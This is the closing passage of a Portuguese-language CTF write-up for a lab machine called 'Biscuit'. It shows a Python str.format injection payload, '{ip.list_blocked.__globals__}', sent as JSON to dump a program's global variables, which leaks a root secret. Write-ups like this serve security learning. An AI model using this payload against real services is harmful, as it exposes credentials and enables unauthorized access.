id="5a1b765c-5c5b-49d6-8cf3-31a5f225dbe4" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2019.png"><img style="width:521px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2019.png"/></a></figure><p id="d52d39be-a3f5-4a8f-968e-a126c4166a26" class="">Abri o arquivo com o nano (antes rodar &#x27;export TERM=xterm&#x27; !!) e come√ßei a edita-lo para tentar retornar algum erro no python que me mostre alguma coisa do programa.</p><figure id="5d922072-5dec-42b5-852f-b4ba13708a6f" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2020.png"><img style="width:364px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2020.png"/></a></figure><figure id="6fd71553-f91b-4b73-8c73-651c2272d260" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2021.png"><img style="width:472px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2021.png"/></a></figure><p id="5ac438b7-cd40-4971-924b-15cc734a8e76" class="">Interessante, aparentemente existe um format string diferente (pouco usado) rodando.</p><p id="1eda3bf5-8515-439e-bfba-0a723fb03f84" class="">Pesquisando sobre esse tipo de format string + vulnerabilites acabei trope√ßando nesse artigo.</p><figure id="4339753e-57e1-4e8c-8d3f-334a4016b1ee"><a href="https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input" class="bookmark source"><div class="bookmark-info"><div class="bookmark-text"><div class="bookmark-title">Are there any Security Concerns to using Python F Strings with User Input</div><div class="bookmark-description">Python&#x27;s f-strings are actually safer. Use them! String formatting may be dangerous when a format string depends on untrusted data. So, when using str.format() or %-formatting, it&#x27;s important to use static format strings, or to sanitize untrusted parts before applying the formatter function.</div></div><div class="bookmark-href"><img src="https://cdn.sstatic.net/Sites/security/Img/favicon.ico?v=54cb45853e3c" class="icon bookmark-icon"/>https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input</div></div><img src="https://cdn.sstatic.net/Sites/security/Img/apple-touch-icon@2.png?v=497726d850f9" class="bookmark-image"/></a></figure><p id="40b07038-2b1d-4efc-8675-d9ee38e00555" class="">Basicamente nele explica-se tudo o que precisamos fazer, por isso n√£o vou explicar direitinho, mas basicamente a forma que esse format string funciona nos permite injetar mais strings para serem formatadas, e se isso √© printado podemos printar todas as v√°riaveis globais que o arquivo usa, normlamente dando alguma key ou senha para n√≥s. (Para quem n√£o entende muito bem ingl√™s √© s√≥ traduzir que fica tranquilo de entender).</p><p id="8cd2c9a3-dc82-4374-9a86-5d06b593c5ec" class="">Ok ent√£o vamos a payload.</p><pre id="83ba4c55-4187-45da-a05d-ae5983e27598" class="code"><code>{&quot;ips&quot;:[&quot;{ip.list_blocked.__globals__}&quot;]}</code></pre><figure id="50258c51-af5e-46ea-adb9-9640eaf5f5b9" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2022.png"><img style="width:1356px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2022.png"/></a></figure><p id="b225c975-1f51-4373-bdf1-ebe3befb9873" class="">Aparentemente funcionou e conseguimos o valor de uma v√°riavel chamada root_secret, provavelmente √© a senha do root.</p><figure id="4224e961-4bf0-45dc-a338-6b8bae077ab6" class="image"><a href="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2023.png"><img style="width:329px" src="UHC%20-%20Biscuit%20-%20WEB%209382da6b826e480b9030094ee8ebd69c/Untitled%2023.png"/></a></figure><p id="1b44a1a1-5131-48e4-8687-930160ab9245" class="">Worked!!</p><p id="0cc63f89-655d-46e3-aced-924575f64280" class="">Obrigado a voc√™ que leu at√© aqui, parab√©ns cadu pela m√°quina, e desclupe por algum erro no write-up, fiz correndo &gt;_&gt;</p></div></article></body></html>